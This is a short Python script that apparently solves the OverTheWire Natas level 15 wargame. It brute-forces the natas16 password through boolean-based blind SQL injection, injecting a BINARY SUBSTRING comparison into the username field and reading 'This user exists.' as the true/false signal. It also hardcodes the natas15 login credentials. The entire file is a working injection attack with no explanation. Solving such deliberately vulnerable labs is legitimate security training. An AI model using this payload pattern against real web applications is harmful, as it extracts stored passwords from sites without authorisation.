import requests
from requests.auth import HTTPBasicAuth
import string

VALID_CHARS = string.ascii_letters + string.digits
PASSWORD_LEN = 32

username = "natas16"
password = ""
count = 1

auth = HTTPBasicAuth("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
url = "http://natas15.natas.labs.overthewire.org/index.php?debug"


'''
    Password brute force loop
'''
while count <= PASSWORD_LEN:
    for c in VALID_CHARS:
        payload = f"username={username}" + "\"" \
            + "AND " + f"BINARY SUBSTRING(password, 1, {str(count)})" \
                + " = " + f"'{password + c}'" + " -- "

        response = requests.post(url, data=payload, headers=headers, auth=auth, verify=False)
        
        # Valid character check
        if "This user exists." in response.text:
            password += c
            count += 1
            
            print(f"Found next character: {password}")

print("Final password")
print(password)
